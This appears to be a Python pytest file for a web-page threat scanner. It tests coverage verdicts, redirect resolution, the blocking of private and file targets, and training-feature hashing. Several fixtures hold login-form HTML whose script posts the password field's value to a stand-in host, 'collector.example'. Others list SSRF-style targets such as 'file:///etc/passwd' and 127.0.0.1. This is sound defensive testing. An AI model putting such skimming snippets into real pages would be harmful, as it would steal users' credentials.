"""Coverage regressions with controlled models; these do not measure accuracy."""

from __future__ import annotations

import hashlib

import pytest
import requests
from app.core.pipeline import ScanningPipeline
from app.models.schemas import StageResult
from app.routers.public_analysis import _public_result
from app.services import page_fetch
from app.services.browser_renderer import BrowserRenderResult
from app.services.html_scraper_scanner import HtmlScraperScanner
from app.services.url_resolver_scanner import UrlResolverScanner
from app.services.url_safety import UrlSafetyResult
from test_detection_policy import FixedScanner, analyze
from test_fetch_context import Response, prepare


@pytest.mark.parametrize(
    "behavior",
    [
        """<form action='/login' onsubmit="fetch('https://collector.example/',
        {method:'POST',body:document.querySelector('input').value});return false">
        <input type='password'></form>""",
        "<form action='/login'><input type='password'></form><script src='/app.js'></script>",
        """<form action='/login'><input type='password' oninput='validate(this)'></form>""",
        """<input type='password'><a href="javascript:sendPassword()">Continue</a>""",
    ],
)
def test_sensitive_javascript_is_unresolved_coverage_not_a_clean_result(
    monkeypatch, behavior: str
):
    result, dom = analyze(monkeypatch, f"<html><title>Sign in</title>{behavior}</html>")
    assert dom.details["rule_threat_score"] == 0
    assert dom.details["requires_review"] is True
    assert dom.details["dynamic_analysis"] == {
        "required": True,
        "available": False,
        "coverage_reasons": ["sensitive_javascript_flow_uninspected"],
    }
    assert dom.verdict == "unknown"
    assert result.scan_status == "partial"
    assert _public_result(result, result.url).final_verdict == "unknown"


def test_sensitive_transfer_observation_is_retained_without_risk_inflation(monkeypatch):
    result, dom = analyze(
        monkeypatch,
        """<form action='/login'><input type='password'></form>
        <script>fetch('https://collector.example/', {body: password.value});</script>""",
    )
    assert dom.details["rule_context"]["sensitive_script_transfer_observed"] is True
    assert dom.details["rule_threat_score"] == 0
    assert result.final_verdict == "unknown"


@pytest.mark.parametrize(
    "frame",
    [
        "<iframe src='https://accounts.example/login'></iframe>",
        "<iframe src='/login'></iframe>",
        "<iframe srcdoc='&lt;input type=password&gt;'></iframe>",
        "<iframe src='data:text/html,%3Cinput%20type=password%3E'></iframe>",
        "<iframe src='https://advertising.example/' hidden></iframe>",
    ],
)
def test_uninspected_frame_cannot_make_outer_page_clean(monkeypatch, frame: str):
    result, dom = analyze(
        monkeypatch,
        f"<html><title>Welcome</title><p>{'An ordinary introduction. ' * 20}</p>{frame}</html>",
    )
    assert dom.details["rule_threat_score"] == 0
    assert dom.details["dynamic_analysis"]["coverage_reasons"] == [
        "embedded_frame_content_uninspected"
    ]
    assert result.scan_status == "partial"
    assert _public_result(result, result.url).final_verdict == "unknown"


@pytest.mark.parametrize(
    "body",
    [
        "<form action='/login' method='post'><input type='password'><button>Continue</button></form>",
        """<form action='/pay'><input autocomplete='cc-number' name='card_number'>
        <input name='cvv'><button>Pay</button></form>""",
        """<form action='/login'><input type='password'></form>
        <script type='application/ld+json'>{"name":"Example"}</script>""",
        "<iframe src='about:blank'></iframe><p>Empty frame</p>",
    ],
)
def test_inspectable_static_forms_and_inert_content_can_remain_clean(monkeypatch, body: str):
    result, dom = analyze(monkeypatch, f"<html><title>Example</title>{body}</html>")
    assert dom.details["rule_threat_score"] == 0
    assert not dom.details["dynamic_analysis"]["required"]
    assert result.scan_status == "complete"
    assert _public_result(result, result.url).final_verdict == "clean"


def test_ordinary_article_analytics_and_keyboard_handler_are_not_a_threat(monkeypatch):
    result, dom = analyze(
        monkeypatch,
        f"""<html><title>News article</title><article><p>{'Ordinary news content. ' * 30}</p></article>
        <script src='https://analytics.example/metrics.js'></script>
        <script>document.onkeydown=scrollArticle;</script></html>""",
    )
    assert dom.details["rule_threat_score"] == 0
    assert dom.details["dynamic_analysis"]["required"] is False
    assert result.final_verdict == "clean"
    assert result.scan_status == "complete"


def test_outer_dom_render_is_not_proof_of_sensitive_script_behavior(monkeypatch):
    html = "<html><form><input type='password'></form><script src='/app.js'></script></html>"
    monkeypatch.setattr(
        HtmlScraperScanner,
        "_maybe_render_html",
        lambda *args: BrowserRenderResult(available=True, html=html, visible_text="Sign in"),
    )
    result, dom = analyze(monkeypatch, html)
    assert dom.details["browser_render"]["available"] is True
    assert dom.details["dynamic_analysis"]["available"] is False
    assert result.scan_status == "partial"
    assert result.final_verdict == "unknown"


def test_training_identity_matches_exact_analyzed_unicode_source(monkeypatch):
    html = "<html><meta charset='utf-8'><title>İşlem</title><p>Static source</p></html>"
    _, dom = analyze(monkeypatch, html)
    payload = dom.training_features
    assert payload["html_features"]
    assert payload["html_hash"] == hashlib.sha256(html.encode("utf-8")).hexdigest()
    assert payload["html_hash_scheme"] == "html-analyzed-utf8-sha256-v1"
    assert payload["feature_url"] == dom.details["final_url"]
    assert "html_hash" not in dom.model_dump()
    assert html not in dom.model_dump_json()


def test_training_identity_follows_rendered_feature_source(monkeypatch):
    rendered = "<html><title>Rendered</title><p>Actual analyzed source</p></html>"
    monkeypatch.setattr(
        HtmlScraperScanner,
        "_maybe_render_html",
        lambda *args: BrowserRenderResult(
            available=True,
            html=rendered,
            final_url="https://shop.example/actual",
            visible_text="Actual analyzed source",
        ),
    )
    _, dom = analyze(monkeypatch, "<html><title>Original</title><p>Original source</p></html>")
    assert dom.training_features["html_hash"] == hashlib.sha256(rendered.encode()).hexdigest()
    assert dom.training_features["feature_url"] == "https://shop.example/actual"


def test_failed_final_get_retains_observed_public_hops_without_refetch(monkeypatch):
    calls: list[str] = []
    checked: list[str] = []
    initial, middle, final = (
        "https://initial.example/", "https://middle.example/", "https://final.example/"
    )
    monkeypatch.setattr(page_fetch, "validate_public_http_url", lambda url: UrlSafetyResult(True))

    def request(method: str, url: str, **kwargs):
        calls.append(url)
        if url == final:
            raise requests.Timeout("test timeout")
        return Response(status=302, location=middle if url == initial else final)

    class Reputation(FixedScanner):
        def scan(self, url: str) -> StageResult:
            checked.append(url)
            return super().scan(url)

    monkeypatch.setattr(page_fetch, "public_http_request", request)
    result = ScanningPipeline(
        [HtmlScraperScanner()],
        redirect_resolver=UrlResolverScanner(),
        threat_intel_scanners=[Reputation(StageResult(scanner="URLhausScanner", verdict="unknown"))],
    ).run(initial)
    resolver = result.stages[0]
    assert resolver.status == "failed"
    assert resolver.details["resolved_url"] == final
    assert [hop["to"] for hop in resolver.details["redirect_chain"]] == [middle, final]
    assert calls == [initial, middle, final]
    assert checked == [initial, middle, final]
    assert result.final_verdict == "unknown"
    assert result.scan_status != "complete"


def test_blocked_final_hop_is_not_an_observed_public_target(monkeypatch):
    initial, middle, blocked = (
        "https://initial.example/", "https://middle.example/", "http://127.0.0.1/"
    )
    calls = prepare(
        monkeypatch,
        [Response(status=302, location=middle), Response(status=302, location=blocked)],
    )
    monkeypatch.setattr(
        page_fetch,
        "validate_public_http_url",
        lambda url: UrlSafetyResult(False, "private", {"blocked_ips": ["127.0.0.1"]})
        if url == blocked else UrlSafetyResult(True),
    )
    resolver = UrlResolverScanner().scan(initial)
    assert resolver.status == "failed"
    assert resolver.details["resolved_url"] == middle
    assert [hop["to"] for hop in resolver.details["redirect_chain"]] == [middle]
    assert [url for _, url in calls] == [initial, middle]
    assert resolver.details["safety"]["blocked_ips"] == ["127.0.0.1"]


def test_worker_failure_metadata_survives_and_alias_is_not_retried(monkeypatch):
    from app.services import worker_process

    initial, final = "https://initial.example/", "https://final.example/"
    failure = page_fetch.FetchFailure(
        "fetch_failed",
        redirect_chain=({"from": initial, "to": final, "status_code": 302, "kind": "http"},),
        resolved_url=final,
    )
    jobs: list[str] = []

    def worker(kind: str, payload, timeout: float):
        jobs.append(kind)
        return failure.to_wire()

    monkeypatch.setattr(worker_process, "run_worker", worker)
    with page_fetch.page_fetch_session(use_worker=True):
        for url in (initial, final):
            with pytest.raises(page_fetch.FetchFailure) as caught:
                page_fetch.fetch_page(url)
            assert caught.value.redirect_chain == failure.redirect_chain
            assert caught.value.resolved_url == final
    assert jobs == ["fetch"]


@pytest.mark.parametrize(
    "target",
    ["http://127.0.0.1/", "http://100.64.0.1/", "https://localhost/", "file:///etc/passwd", "https://user:secret@final.example/"],
)
def test_impossible_worker_failure_targets_are_rejected(target: str):
    initial = "https://initial.example/"
    failure = page_fetch.FetchFailure(
        "fetch_failed",
        redirect_chain=({"from": initial, "to": target, "status_code": 302, "kind": "http"},),
        resolved_url=target,
    )
    with pytest.raises(ValueError):
        page_fetch.FetchFailure.from_wire(failure.to_wire(), initial)


def test_failure_worker_chain_cannot_invent_an_unrelated_origin():
    failure = page_fetch.FetchFailure(
        "fetch_failed",
        redirect_chain=({"from": "https://unrelated.example/", "to": "https://final.example/", "status_code": 302, "kind": "http"},),
        resolved_url="https://final.example/",
    )
    with pytest.raises(ValueError):
        page_fetch.FetchFailure.from_wire(failure.to_wire(), "https://initial.example/")


def test_redirect_limit_failure_remains_bounded_and_round_trips(monkeypatch):
    initial = "https://initial.example/"
    prepare(monkeypatch, [Response(status=302, location=f"/{i}") for i in range(6)])
    with pytest.raises(page_fetch.FetchFailure) as caught:
        page_fetch.fetch_page(initial)
    failure = caught.value
    assert failure.code == "redirect_limit"
    assert len(failure.redirect_chain) == page_fetch.MAX_REDIRECTS
    assert page_fetch.FetchFailure.from_wire(failure.to_wire(), initial).resolved_url == failure.resolved_url
